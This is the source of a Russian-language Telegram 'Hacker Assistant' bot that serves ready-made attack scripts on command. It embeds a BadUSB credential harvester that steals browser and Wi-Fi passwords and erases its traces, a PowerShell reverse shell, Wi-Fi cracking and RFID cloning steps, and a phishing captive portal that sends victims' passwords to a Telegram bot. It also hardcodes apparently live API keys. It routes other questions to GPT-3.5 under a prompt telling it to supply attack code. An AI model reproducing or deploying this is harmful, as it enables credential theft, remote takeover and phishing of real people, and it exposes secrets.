import asyncio
import logging
import aiohttp
from datetime import datetime
from collections import deque
import random

# ===== ТВОИ ДАННЫЕ =====
TELEGRAM_TOKEN = "8779184779:AAGcQ_xy4RlxYoAyZrNqCa6TLxlwFghVkwQ"
OPENROUTER_KEY = "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"
MODEL = "openai/gpt-3.5-turbo"

# База знаний хакера (скрипты и коды)
HACKER_KNOWLEDGE = {
    "badusb_windows": [
        {
            "name": "Credential Harvester",
            "description": "Собирает все сохранённые пароли из браузеров (Chrome, Edge, Firefox) на Windows",
            "code": """REM ===== CREDENTIAL HARVESTER =====
REM Требуется флешка с именем MYUSB
DEFAULT_DELAY 300
DELAY 2000

GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 2000

REM Создаём папку для трофеев
STRING $folder = "$env:TEMP\\harvester"
ENTER
DELAY 500
STRING New-Item -ItemType Directory -Path $folder -Force | Out-Null
ENTER
DELAY 1000

REM Wi-Fi пароли
STRING netsh wlan show profiles | Select-String ':' | ForEach-Object { $_.ToString().Split(':')[1].Trim() } | ForEach-Object { netsh wlan show profile name=$_ key=clear } >> $folder\\wifi.txt
ENTER
DELAY 5000

REM Chrome
STRING $chrome = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
ENTER
DELAY 500
STRING if (Test-Path $chrome) { Copy-Item $chrome $folder\\chrome.db -Force }
ENTER
DELAY 1000

REM Edge
STRING $edge = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
ENTER
DELAY 500
STRING if (Test-Path $edge) { Copy-Item $edge $folder\\edge.db -Force }
ENTER
DELAY 1000

REM Копируем на флешку MYUSB
STRING if (Test-Path "D:\\") { Copy-Item $folder\\* -Destination "D:\\hacked_data\\" -Recurse -Force }
ENTER
DELAY 2000

REM Чистим следы
STRING Remove-Item $folder -Recurse -Force
ENTER
DELAY 1000
STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
ENTER
DELAY 500
STRING exit
ENTER

CAPSLOCK""",
            "source": "github.com/anste5/BadUSB-badkb [citation:10]"
        },
        {
            "name": "Reverse Shell",
            "description": "Открывает обратную shell-сессию на указанный IP и порт",
            "code": """REM ===== REVERSE SHELL WINDOWS =====
REM Замени IP и PORT на свои
DEFAULT_DELAY 300
DELAY 2000

GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 2000

STRING $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);
STRING $stream = $client.GetStream();
STRING [byte[]]$bytes = 0..65535|%{0};
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
STRING   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
STRING   $sendback = (iex $data 2>&1 | Out-String );
STRING   $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
STRING   $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
STRING   $stream.Write($sendbyte,0,$sendbyte.Length);
STRING   $stream.Flush()
STRING };
STRING $client.Close()
ENTER

STRING exit
ENTER""",
            "source": "github.com/D4rkDr4gon/flipper-zero-Utils [citation:8]"
        }
    ],
    
    "badusb_ios": [
        {
            "name": "Tab Flooder",
            "description": "Открывает кучу вкладок в Safari на iPhone/iPad",
            "code": """REM ===== iOS TAB FLOODER =====
REM Работает на разблокированном устройстве
DEFAULT_DELAY 300
DELAY 2000

HOME
DELAY 1000
TAP 200 500
DELAY 2000

STRING about:blank
ENTER
DELAY 1000

REM Открываем новые вкладки
GUI t
DELAY 500
STRING https://google.com
ENTER
DELAY 800

GUI t
DELAY 500
STRING https://youtube.com
ENTER
DELAY 800

GUI t
DELAY 500
STRING https://facebook.com
ENTER
DELAY 800

REM Повторить N раз""",
            "source": "github.com/gam3r999/Flipper-Zero-iOS [citation:4]"
        },
        {
            "name": "Rick Roll",
            "description": "Открывает YouTube с Rick Astley на iPhone",
            "code": """REM ===== iOS RICK ROLL =====
DEFAULT_DELAY 300
DELAY 2000

HOME
DELAY 1000
TAP 200 500
DELAY 2000

STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER""",
            "source": "KZ-CERT / Anti-Malware.ru [citation:2][citation:6]"
        }
    ],
    
    "wifi": [
        {
            "name": "WiFi Brute Forcer",
            "description": "Скрипт для брутфорса Wi-Fi handshake (требуется WiFi модуль)",
            "code": """#!/bin/bash
# WiFi Handshake Capture & Brute Force
# Для Kali Linux с aircrack-ng

# Переводим адаптер в режим монитора
sudo airmon-ng start wlan0

# Сканируем сети
sudo airodump-ng wlan0mon

# Когда нашли цель, захватываем handshake
# sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon

# Деаутентификация клиента
# sudo aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# Брутфорс с rockyou.txt
# sudo aircrack-ng -w rockyou.txt capture-01.cap""",
            "source": "github.com/riccardocar99/bruteforce-wifi [citation:3]"
        }
    ],
    
    "rfid": [
        {
            "name": "RFID Cloner",
            "description": "Инструкция по клонированию RFID-карт на Flipper",
            "code": """# КЛОНИРОВАНИЕ RFID НА FLIPPER ZERO

1. Открой NFC/RFID на флиппере
2. Выбери "Read" и поднеси карту
3. Сохрани прочитанный UID
4. Выбери "Emulate" или "Write" на чистую карту

# Для iClass/Picopass:
- Используй приложение Picopass
- Требуется специальная прошивка (Momentum/Xtreme)""",
            "source": "github.com/D4rkDr4gon/flipper-zero-Utils [citation:8]"
        }
    ],
    
    "bluetooth": [
        {
            "name": "BLE Spam",
            "description": "Спам уведомлениями на iPhone (требуется прошивка Xtreme/Momentum)",
            "code": """# BLE SPAM НА FLIPPER ZERO

1. Установи прошивку Xtreme или Momentum
2. Открой Applications → Bluetooth → BLE Spam
3. Выбери iOS Spam
4. Нажми Start

# Можно настроить имя фейкового устройства
BLE Spam → iOS → Custom Name → "Free AirPods" """,
            "source": "KZ-CERT / Anti-Malware.ru [citation:2][citation:6]"
        }
    ],
    
    "evilportal": [
        {
            "name": "Evil Portal Captive Portal",
            "description": "Фишинговый портал для WiFi-ловушки",
            "html_code": """<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        input { padding: 10px; margin: 5px; width: 200px; }
        button { padding: 10px 20px; background: #4CAF50; color: white; border: none; }
    </style>
</head>
<body>
    <h2>WiFi Authentication Required</h2>
    <p>Enter password to access the network</p>
    <input type="password" id="pass" placeholder="Password">
    <br>
    <button onclick="sendPass()">Connect</button>
    
    <script>
        function sendPass() {
            const pass = document.getElementById('pass').value;
            fetch('https://api.telegram.org/bot' + '8779184779:AAGcQ_xy4RlxYoAyZrNqCa6TLxlwFghVkwQ' + '/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: '6689561934',
                    text: 'WiFi Pass: ' + pass
                })
            }).then(() => {
                window.location.href = 'https://google.com';
            });
        }
    </script>
</body>
</html>""",
            "source": "github.com/aleff-github/my-flipper-shits [citation:5]"
        }
    ],
    
    "js": [
        {
            "name": "JavaScript Template",
            "description": "Шаблон для создания JS-скриптов на Flipper",
            "code": """// ===== FLIPPER ZERO JS TEMPLATE =====
// Сохрани как .js в /apps/Scripts/

let badusb = require("badusb");
let notify = require("notification");
let dialog = require("dialog");

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB });

dialog.message("Title", "Press OK to start");

if (badusb.isConnected()) {
    notify.blink("green", "short");
    
    // Твой код здесь
    badusb.println("Hello from Flipper!");
    
    notify.success();
} else {
    notify.error();
}

badusb.quit();""",
            "source": "github.com/MrPotatoXx/flipper-zero-js-scripts [citation:1]"
        }
    ]
}

# Хранилище истории диалогов
conversations = {}
user_sessions = {}

logging.basicConfig(level=logging.INFO)

async def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    async with aiohttp.ClientSession() as session:
        await session.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"})

async def send_typing_action(chat_id):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendChatAction"
    async with aiohttp.ClientSession() as session:
        await session.post(url, json={"chat_id": chat_id, "action": "typing"})

async def get_ai_response(messages):
    url = "https://openrouter.ai/api/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {OPENROUTER_KEY}",
        "Content-Type": "application/json",
        "HTTP-Referer": "https://t.me/hacker_assistant_bot",
        "X-Title": "Hacker Assistant"
    }
    data = {
        "model": MODEL,
        "messages": messages,
        "temperature": 0.7,
        "max_tokens": 1500
    }
    
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=data) as resp:
            result = await resp.json()
            try:
                return result["choices"][0]["message"]["content"]
            except Exception as e:
                return f"❌ Ошибка AI: {result.get('error', {}).get('message', 'Неизвестная ошибка')}"

def format_script_output(script):
    """Форматирует вывод скрипта для Telegram"""
    output = f"<b>{script['name']}</b>\n"
    output += f"<i>{script['description']}</i>\n"
    output += f"📁 Источник: {script.get('source', 'Unknown')}\n\n"
    
    if 'code' in script:
        output += f"<pre><code class='language-ducky'>{script['code']}</code></pre>\n"
    elif 'html_code' in script:
        output += f"<pre><code class='language-html'>{script['html_code']}</code></pre>\n"
    
    return output

async def handle_update(update):
    try:
        if "message" not in update:
            return
        
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        user_id = msg["from"]["id"]
        text = msg.get("text", "").lower()
        
        # Команда /start
        if text == "/start":
            welcome = """<b>🔐 HACKER ASSISTANT BOT 🔐</b>

Привет, брат! Я помогу тебе с скриптами и кодами для Flipper Zero и не только.

<b>📚 ДОСТУПНЫЕ КОМАНДЫ:</b>

/badusb windows - Скрипты для Windows (эксплойты, кража)
/badusb ios - Скрипты для iPhone/iPad
/wifi - Инструменты для взлома Wi-Fi
/rfid - Работа с RFID/NFC картами
/bluetooth - Bluetooth-атаки (BLE Spam)
/evilportal - Фишинговые порталы
/js - JavaScript скрипты
/help - Все команды

Просто напиши, что тебе нужно, и AI подберёт код!"""
            await send_telegram_message(chat_id, welcome)
            return
        
        # Команда /help
        if text == "/help":
            help_text = """<b>📋 ПОЛНЫЙ СПИСОК КОМАНД:</b>

/badusb windows - Скрипты для Windows
/badusb ios - Скрипты для iOS
/wifi - Wi-Fi атаки
/rfid - RFID/NFC
/bluetooth - Bluetooth
/evilportal - Фишинговые порталы
/js - JavaScript скрипты

Также ты можешь просто описать, что тебе нужно, и AI подберёт код."""
            await send_telegram_message(chat_id, help_text)
            return
        
        # Команда /badusb windows
        if text == "/badusb windows":
            await send_typing_action(chat_id)
            scripts = HACKER_KNOWLEDGE["badusb_windows"]
            for script in scripts:
                await send_telegram_message(chat_id, format_script_output(script))
            return
        
        # Команда /badusb ios
        if text == "/badusb ios":
            await send_typing_action(chat_id)
            scripts = HACKER_KNOWLEDGE["badusb_ios"]
            for script in scripts:
                await send_telegram_message(chat_id, format_script_output(script))
            return
        
        # Команда /wifi
        if text == "/wifi":
            await send_typing_action(chat_id)
            scripts = HACKER_KNOWLEDGE["wifi"]
            for script in scripts:
                await send_telegram_message(chat_id, format_script_output(script))
            return
        
        # Команда /rfid
        if text == "/rfid":
            await send_typing_action(chat_id)
            scripts = HACKER_KNOWLEDGE["rfid"]
            for script in scripts:
                await send_telegram_message(chat_id, format_script_output(script))
            return
        
        # Команда /bluetooth
        if text == "/bluetooth":
            await send_typing_action(chat_id)
            scripts = HACKER_KNOWLEDGE["bluetooth"]
            for script in scripts:
                await send_telegram_message(chat_id, format_script_output(script))
            return
        
        # Команда /evilportal
        if text == "/evilportal":
            await send_typing_action(chat_id)
            scripts = HACKER_KNOWLEDGE["evilportal"]
            for script in scripts:
                await send_telegram_message(chat_id, format_script_output(script))
            return
        
        # Команда /js
        if text == "/js":
            await send_typing_action(chat_id)
            scripts = HACKER_KNOWLEDGE["js"]
            for script in scripts:
                await send_telegram_message(chat_id, format_script_output(script))
            return
        
        # Если не команда - AI отвечает
        if not text.startswith("/"):
            await send_typing_action(chat_id)
            
            # Инициализируем историю
            if user_id not in conversations:
                conversations[user_id] = deque(maxlen=10)
            
            conversations[user_id].append({"role": "user", "content": text})
            
            # Системный промпт для AI
            system_prompt = """Ты хакер-помощник, который даёт скрипты и коды для Flipper Zero и пентеста. 
            Отвечай кратко, по делу, с практическими примерами кода. 
            Если просят скрипт - давай готовый код в формате DuckyScript, Python, Bash или HTML.
            Все материалы ТОЛЬКО для образовательных целей и тестирования своих устройств."""
            
            messages = [{"role": "system", "content": system_prompt}]
            messages.extend(list(conversations[user_id])[-5:])
            
            ai_response = await get_ai_response(messages)
            
            conversations[user_id].append({"role": "assistant", "content": ai_response})
            await send_telegram_message(chat_id, ai_response)
        
    except Exception as e:
        logging.error(f"Ошибка: {e}")

async def main():
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
    offset = 0
    
    logging.info("🚀 HACKER BOT ЗАПУЩЕН! Жду команды...")
    print("✅ Бот работает! Напиши ему /start")
    
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, params={"offset": offset, "timeout": 30}) as resp:
                    data = await resp.json()
                    
                    if data["ok"] and data["result"]:
                        for update in data["result"]:
                            await handle_update(update)
                            offset = update["update_id"] + 1
                    
        except Exception as e:
            logging.error(f"Ошибка соединения: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())